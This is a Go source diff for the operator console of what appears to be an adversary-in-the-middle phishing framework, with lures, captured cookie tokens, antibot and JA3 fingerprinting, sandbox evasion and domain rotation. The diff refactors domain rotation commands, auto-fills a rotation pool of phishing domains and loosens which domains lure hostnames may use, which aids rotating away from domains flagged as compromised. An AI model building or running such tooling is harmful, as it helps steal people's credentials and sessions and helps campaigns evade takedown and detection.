@@ -984,40 +984,65 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 
 	if pn == 0 {
 		stats := dm.GetStats()
+		log.Info("")
 		log.Info("Domain Rotation Configuration:")
-		log.Info("  Enabled: %v", stats["rotation_enabled"])
-		log.Info("  Strategy: %s", stats["strategy"])
+		log.Info("─────────────────────────────────────────────────────────────")
+		log.Info("  Enabled:           %v", stats["rotation_enabled"])
+		log.Info("  Strategy:          %s", stats["strategy"])
 		log.Info("  Rotation Interval: %d minutes", stats["rotation_interval"])
-		log.Info("  Max Domains: %d", stats["max_domains"])
-		log.Info("  Auto Generate: %v", stats["auto_generate"])
-		log.Info("  Active Domains: %d", stats["active_domains"])
-		log.Info("  Healthy Domains: %d", stats["healthy_domains"])
-		log.Info("  Total Rotations: %d", stats["total_rotations"])
-		log.Info("  Compromised: %d", stats["compromised_count"])
+		log.Info("  Max Domains:       %d", stats["max_domains"])
+		log.Info("  Auto Generate:     %v", stats["auto_generate"])
+		log.Info("─────────────────────────────────────────────────────────────")
+		log.Info("  Active Domains:    %d", stats["active_domains"])
+		log.Info("  Healthy Domains:   %d", stats["healthy_domains"])
+		log.Info("  Total Rotations:   %d", stats["total_rotations"])
+		log.Info("  Compromised:       %d", stats["compromised_count"])
+		log.Info("─────────────────────────────────────────────────────────────")
+		log.Info("")
+		log.Info("Use 'domains rotation enable on' to enable rotation")
+		log.Info("Use 'domains rotation list' to see all domains in the pool")
+		log.Info("Use 'domains rotation stats' for detailed statistics")
 		return nil
 	}
 
 	switch args[0] {
-	case "on":
-		dm.SetRotationEnabled(true)
-		dm.Start()
-		log.Success("Domain rotation enabled")
-		return nil
-	case "off":
-		dm.SetRotationEnabled(false)
-		dm.Stop()
-		log.Success("Domain rotation disabled")
+	case "enable":
+		// domains rotation enable on|off
+		if pn < 2 {
+			return fmt.Errorf("syntax: domains rotation enable <on|off>")
+		}
+		switch args[1] {
+		case "on":
+			t.autoPopulateRotationPool(dm)
+			dm.SetRotationEnabled(true)
+			dm.Start()
+			log.Success("domain rotation enabled")
+		case "off":
+			dm.SetRotationEnabled(false)
+			dm.Stop()
+			log.Success("domain rotation disabled")
+		default:
+			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
+		}
 		return nil
 	case "strategy":
 		if pn < 2 {
 			return fmt.Errorf("syntax: domains rotation strategy <round-robin|weighted|health-based|random>")
 		}
 		s := args[1]
-		if s != "round-robin" && s != "weighted" && s != "health-based" && s != "random" {
-			return fmt.Errorf("invalid strategy: %s", s)
+		validStrategies := []string{"round-robin", "weighted", "health-based", "random"}
+		isValid := false
+		for _, vs := range validStrategies {
+			if s == vs {
+				isValid = true
+				break
+			}
+		}
+		if !isValid {
+			return fmt.Errorf("invalid strategy: %s (valid: round-robin, weighted, health-based, random)", s)
 		}
 		dm.SetStrategy(s)
-		log.Success("Strategy set to: %s", s)
+		log.Success("rotation strategy set to: %s", s)
 		return nil
 	case "interval":
 		if pn < 2 {
@@ -1025,21 +1050,21 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		}
 		ival, err := strconv.Atoi(args[1])
 		if err != nil || ival < 1 {
-			return fmt.Errorf("invalid interval: %s", args[1])
+			return fmt.Errorf("invalid interval: %s (must be a positive number of minutes)", args[1])
 		}
 		dm.SetRotationInterval(ival)
-		log.Success("Rotation interval set to: %d minutes", ival)
+		log.Success("rotation interval set to: %d minutes", ival)
 		return nil
-	case "max":
+	case "max-domains":
 		if pn < 2 {
-			return fmt.Errorf("syntax: domains rotation max <n>")
+			return fmt.Errorf("syntax: domains rotation max-domains <count>")
 		}
 		mx, err := strconv.Atoi(args[1])
 		if err != nil || mx < 1 {
-			return fmt.Errorf("invalid count: %s", args[1])
+			return fmt.Errorf("invalid count: %s (must be a positive number)", args[1])
 		}
 		dm.SetMaxDomains(mx)
-		log.Success("Max domains set to: %d", mx)
+		log.Success("max domains set to: %d", mx)
 		return nil
 	case "auto-generate":
 		if pn < 2 {
@@ -1048,12 +1073,12 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		switch args[1] {
 		case "on":
 			dm.SetAutoGenerate(true)
-			log.Success("Auto-generation enabled")
+			log.Success("auto-generation enabled")
 		case "off":
 			dm.SetAutoGenerate(false)
-			log.Success("Auto-generation disabled")
+			log.Success("auto-generation disabled")
 		default:
-			return fmt.Errorf("invalid value: %s (use on or off)", args[1])
+			return fmt.Errorf("invalid value: %s (use 'on' or 'off')", args[1])
 		}
 		return nil
 	case "add-provider":
@@ -1072,26 +1097,29 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		return nil
 	case "stats":
 		stats := dm.GetStats()
+		log.Info("")
 		log.Info("=== Domain Rotation Statistics ===")
 		log.Info("")
 		log.Info("System Status:")
-		log.Info("  Enabled: %v", stats["rotation_enabled"])
-		log.Info("  Strategy: %s", stats["strategy"])
-		log.Info("  Total Rotations: %d", stats["total_rotations"])
-		log.Info("  Last Rotation: %s", stats["last_rotation"])
+		log.Info("  Enabled:          %v", stats["rotation_enabled"])
+		log.Info("  Strategy:         %s", stats["strategy"])
+		log.Info("  Total Rotations:  %d", stats["total_rotations"])
+		log.Info("  Last Rotation:    %s", stats["last_rotation"])
 		log.Info("")
 		log.Info("Domain Status:")
-		log.Info("  Active Domains: %d", stats["active_domains"])
-		log.Info("  Healthy Domains: %d", stats["healthy_domains"])
-		log.Info("  Compromised Count: %d", stats["compromised_count"])
-		log.Info("  Max Domains: %d", stats["max_domains"])
+		log.Info("  Active Domains:   %d", stats["active_domains"])
+		log.Info("  Healthy Domains:  %d", stats["healthy_domains"])
+		log.Info("  Compromised:      %d", stats["compromised_count"])
+		log.Info("  Max Domains:      %d", stats["max_domains"])
 		return nil
 	case "list":
 		domains := dm.GetAllDomains()
 		if len(domains) == 0 {
-			log.Info("No domains in rotation pool")
+			log.Info("no domains in rotation pool")
+			log.Info("tip: enable rotation with 'domains rotation enable on' to auto-populate from configured domains")
 			return nil
 		}
+		log.Info("")
 		log.Info("=== Domains in Rotation Pool ===")
 		log.Info("")
 		log.Info("%-30s %-10s %-7s %-15s %-10s %s", "Domain", "Status", "Health", "Provider", "Requests", "Created")
@@ -1107,24 +1135,10 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		}
 		return nil
 	case "add-domain":
-		if pn < 4 {
-			return fmt.Errorf("syntax: domains rotation add-domain <domain> <subdomain> <provider>")
-		}
-		err := dm.AddDomain(args[1], args[2], args[3], "", false)
-		if err != nil {
-			return err
-		}
-		log.Success("Domain %s.%s added to rotation pool", args[2], args[1])
+		log.Info("use 'domains add <domain>' to add domains - they are auto-populated into rotation when enabled")
 		return nil
 	case "remove-domain":
-		if pn < 2 {
-			return fmt.Errorf("syntax: domains rotation remove-domain <full_domain>")
-		}
-		err := dm.RemoveDomain(args[1])
-		if err != nil {
-			return err
-		}
-		log.Success("Domain %s removed from rotation pool", args[1])
+		log.Info("use 'domains remove <domain>' to remove domains from the pool")
 		return nil
 	case "mark-compromised":
 		if pn < 3 {
@@ -1135,10 +1149,51 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 		if err != nil {
 			return err
 		}
-		log.Success("Domain %s marked as compromised", args[1])
+		log.Success("domain %s marked as compromised", args[1])
 		return nil
 	default:
-		return fmt.Errorf("unknown subcommand: %s", args[0])
+		return fmt.Errorf("unknown rotation subcommand: %s (use 'help domains' for available commands)", args[0])
+	}
+}
+
+// autoPopulateRotationPool adds all configured domains (base domain + pool) to the rotation pool
+// if they are not already present. Called automatically when rotation is enabled.
+func (t *Terminal) autoPopulateRotationPool(dm *DomainManager) {
+	existing := dm.GetAllDomains()
+	existingMap := make(map[string]bool)
+	for _, d := range existing {
+		existingMap[strings.ToLower(d.FullDomain)] = true
+	}
+
+	var added []string
+
+	// Add the base/primary domain if set
+	baseDomain := t.cfg.GetBaseDomain()
+	if baseDomain != "" && !existingMap[strings.ToLower(baseDomain)] {
+		err := dm.AddDomain(baseDomain, "", "", "auto-populated from base domain", true)
+		if err == nil {
+			added = append(added, baseDomain)
+		}
+	}
+
+	// Add all domains from the domain pool that aren't already in rotation
+	poolDomains := dm.GetAllDomains()
+	for _, d := range poolDomains {
+		lower := strings.ToLower(d.FullDomain)
+		if !existingMap[lower] {
+			err := dm.AddDomain(d.FullDomain, "", d.DNSProvider, "auto-populated from domain pool", false)
+			if err == nil {
+				added = append(added, d.FullDomain)
+			}
+		}
+	}
+
+	if len(added) > 0 {
+		log.Info("auto-populated %d domain(s) into rotation pool: %s", len(added), strings.Join(added, ", "))
+	} else if len(existing) > 0 {
+		log.Info("rotation pool already contains %d domain(s)", len(existing))
+	} else {
+		log.Warning("no domains configured - add domains with 'domains add <domain>' first")
 	}
 }
 func (t *Terminal) handleTrafficShaping(args []string) error {
@@ -1707,7 +1762,8 @@ func (t *Terminal) handleAntibot(args []string) error {
 	case "captcha":
 		return t.handleCaptcha(args[1:])
 	case "domain-rotation":
-		return t.handleDomainRotation(args[1:])
+		log.Info("domain rotation has moved to 'domains rotation' - use 'help domains' for commands")
+		return nil
 	default:
 		// Attempt to parse global antibot config (e.g. antibot enabled, antibot action)
 		if pn == 1 {
@@ -2371,7 +2427,7 @@ func (t *Terminal) handleLures(args []string) error {
 				l.PausedUntil = t_now.Add(t_dur).Unix()
 				err = t.cfg.SetLure(l_id, l)
 				if err != nil {
-					return fmt.Errorf("edit: %v", err)
+					return fmt.Errorf("pause: %v", err)
 				}
 				return nil
 			}
@@ -2413,8 +2469,8 @@ func (t *Terminal) handleLures(args []string) error {
 					if val != "" {
 						val = strings.ToLower(val)
 
-						if val != t.cfg.GetBaseDomain() && !strings.HasSuffix(val, "."+t.cfg.GetBaseDomain()) {
-							return fmt.Errorf("edit: lure hostname must end with the base domain '%s'", t.cfg.GetBaseDomain())
+						if val != t.cfg.GetBaseDomain() && !strings.HasSuffix(val, "."+t.cfg.GetBaseDomain()) && !t.cfg.IsDomainValid(val) {
+							return fmt.Errorf("edit: lure hostname must end with one of the configured domains (use 'domains list' to see available)")
 						}
 						host_re := regexp.MustCompile(`^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$`)
 						if !host_re.MatchString(val) {
@@ -3284,7 +3340,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
 	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
 
-	h.AddCommand("domains", "general", "manage domain configuration and rotation", "Unified domain management: set base domain, manage domain pool, and configure domain rotation.", LAYER_TOP,
+	h.AddCommand("domains", "general", "manage domain configuration and rotation", "Unified domain management: set base domain, manage domain pool, and\nconfigure domain rotation. When rotation is enabled, all configured\ndomains are automatically added to the rotation pool.", LAYER_TOP,
 		readline.PcItem("domains",
 			readline.PcItem("set"),
 			readline.PcItem("list"),
@@ -3299,8 +3355,6 @@ func (t *Terminal) createHelp() {
 				readline.PcItem("interval"),
 				readline.PcItem("max-domains"),
 				readline.PcItem("auto-generate", readline.PcItem("on"), readline.PcItem("off")),
-				readline.PcItem("add-domain"),
-				readline.PcItem("remove-domain"),
 				readline.PcItem("list"),
 				readline.PcItem("add-provider"),
 				readline.PcItem("mark-compromised"),
@@ -3315,13 +3369,11 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("domains", []string{"enable"}, "enable <domain>", "enable a domain for use")
 	h.AddSubCommand("domains", []string{"disable"}, "disable <domain>", "disable a domain (keeps it in pool but inactive)")
 	h.AddSubCommand("domains", []string{"rotation"}, "rotation", "show domain rotation configuration")
-	h.AddSubCommand("domains", []string{"rotation", "enable"}, "rotation enable <on|off>", "enable or disable automatic domain rotation")
+	h.AddSubCommand("domains", []string{"rotation", "enable"}, "rotation enable <on|off>", "enable or disable automatic domain rotation (auto-populates pool from configured domains)")
 	h.AddSubCommand("domains", []string{"rotation", "strategy"}, "rotation strategy <round-robin|weighted|health-based|random>", "set rotation strategy")
 	h.AddSubCommand("domains", []string{"rotation", "interval"}, "rotation interval <minutes>", "set rotation interval in minutes")
 	h.AddSubCommand("domains", []string{"rotation", "max-domains"}, "rotation max-domains <count>", "set maximum number of domains in pool")
 	h.AddSubCommand("domains", []string{"rotation", "auto-generate"}, "rotation auto-generate <on|off>", "enable or disable automatic domain generation")
-	h.AddSubCommand("domains", []string{"rotation", "add-domain"}, "rotation add-domain <domain> <subdomain> <provider>", "add a domain to the rotation pool")
-	h.AddSubCommand("domains", []string{"rotation", "remove-domain"}, "rotation remove-domain <full_domain>", "remove a domain from the rotation pool")
 	h.AddSubCommand("domains", []string{"rotation", "list"}, "rotation list", "list all domains in the rotation pool")
 	h.AddSubCommand("domains", []string{"rotation", "add-provider"}, "rotation add-provider <name> <type> <api_key> <api_secret> <zone>", "add a DNS provider for domain rotation")
 	h.AddSubCommand("domains", []string{"rotation", "mark-compromised"}, "rotation mark-compromised <full_domain> <reason>", "mark a domain as compromised")
@@ -3394,7 +3446,6 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("override_ips", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove")),
 			readline.PcItem("ja3", readline.PcItem("stats"), readline.PcItem("signatures"), readline.PcItem("add"), readline.PcItem("export")),
 			readline.PcItem("captcha", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("provider"), readline.PcItem("configure"), readline.PcItem("require", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("test")),
-			readline.PcItem("domain-rotation", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("strategy"), readline.PcItem("interval"), readline.PcItem("list"), readline.PcItem("stats")),
 			readline.PcItem("traffic-shaping", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("mode"), readline.PcItem("global-limit"), readline.PcItem("ip-limit"), readline.PcItem("bandwidth-limit"), readline.PcItem("geo-rule"), readline.PcItem("stats")),
 			readline.PcItem("sandbox", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("mode"), readline.PcItem("threshold"), readline.PcItem("action"), readline.PcItem("redirect"), readline.PcItem("honeypot"), readline.PcItem("stats")),
 			readline.PcItem("polymorphic", readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("level"), readline.PcItem("cache"), readline.PcItem("seed-rotation"), readline.PcItem("template-mode"), readline.PcItem("mutation"), readline.PcItem("test"), readline.PcItem("stats"))))
@@ -3421,12 +3472,6 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("antibot", []string{"captcha", "require"}, "captcha require <on|off>", "require CAPTCHA verification for all lures")
 	h.AddSubCommand("antibot", []string{"captcha", "test"}, "captcha test", "display test page URL for verifying CAPTCHA integration")
 
-	h.AddSubCommand("antibot", []string{"domain-rotation"}, "domain-rotation", "show domain rotation configuration (also available via 'domains rotation')")
-	h.AddSubCommand("antibot", []string{"domain-rotation", "enable"}, "domain-rotation enable <on|off>", "enable or disable automatic domain rotation")
-	h.AddSubCommand("antibot", []string{"domain-rotation", "strategy"}, "domain-rotation strategy <round-robin|weighted|health-based|random>", "set rotation strategy")
-	h.AddSubCommand("antibot", []string{"domain-rotation", "interval"}, "domain-rotation interval <minutes>", "set rotation interval")
-	h.AddSubCommand("antibot", []string{"domain-rotation", "list"}, "domain-rotation list", "list all domains in the rotation pool")
-	h.AddSubCommand("antibot", []string{"domain-rotation", "stats"}, "domain-rotation stats", "show rotation statistics")
 
 	h.AddSubCommand("antibot", []string{"traffic-shaping"}, "traffic-shaping", "show traffic shaping configuration and metrics")
 	h.AddSubCommand("antibot", []string{"traffic-shaping", "enable"}, "traffic-shaping enable <on|off>", "enable or disable traffic shaping")
@@ -3517,7 +3562,7 @@ func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.Coo
 
 func (t *Terminal) checkStatus() {
 	if t.cfg.GetBaseDomain() == "" {
-		log.Warning("server domain not set! type: config domain <domain>")
+		log.Warning("server domain not set! type: domains set <domain>")
 	}
 	if t.cfg.GetServerExternalIP() == "" {
 		log.Warning("server external ip not set! type: config ipv4 <external_ipv4_address>")
